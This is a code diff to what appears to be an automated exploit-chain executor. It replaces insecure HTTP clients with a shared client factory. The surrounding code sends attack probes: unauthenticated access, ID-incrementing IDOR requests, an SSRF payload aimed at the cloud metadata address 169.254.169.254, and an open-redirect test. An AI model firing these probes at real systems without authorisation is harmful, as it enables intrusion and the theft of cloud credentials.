@@ -46,6 +46,7 @@ from typing import Any, Dict, List, Optional, TYPE_CHECKING
 from urllib.parse import urlparse, urljoin
 
 import httpx
+from core.net.http_factory import create_async_client
 
 if TYPE_CHECKING:
     from core.omega.nexus_phase import ExploitChain, ChainStep as NEXUSChainStep, GoalState
@@ -517,7 +518,7 @@ class ChainExecutor:
         """Execute MISSING_AUTH primitive - attempt to access endpoint without auth."""
         url = urljoin(f"https://{target}", step.primitive.target)
 
-        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
+        async with create_async_client(follow_redirects=False) as client:
             response = await client.get(url)
             return {
                 "status_code": response.status_code,
@@ -534,7 +535,7 @@ class ChainExecutor:
             # Try accessing different IDs
             url = url.replace(f"={step.primitive.parameter}", f"={int(step.primitive.parameter) + 1}")
 
-        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
+        async with create_async_client(follow_redirects=False) as client:
             response = await client.get(url)
             return {
                 "status_code": response.status_code,
@@ -550,7 +551,7 @@ class ChainExecutor:
         if step.primitive.parameter:
             url = f"{url}?{step.primitive.parameter}=http://169.254.169.254/latest/meta-data/"
 
-        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
+        async with create_async_client(follow_redirects=False) as client:
             response = await client.get(url)
             return {
                 "status_code": response.status_code,
@@ -567,7 +568,7 @@ class ChainExecutor:
         if step.primitive.parameter:
             url = f"{url}?{step.primitive.parameter}={test_payload}"
 
-        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
+        async with create_async_client(follow_redirects=False) as client:
             response = await client.get(url)
             return {
                 "status_code": response.status_code,
@@ -584,7 +585,7 @@ class ChainExecutor:
         if step.primitive.parameter:
             url = f"{url}?{step.primitive.parameter}=https://example.com"
 
-        async with httpx.AsyncClient(verify=False, follow_redirects=False) as client:
+        async with create_async_client(follow_redirects=False) as client:
             response = await client.get(url)
             return {
                 "status_code": response.status_code,
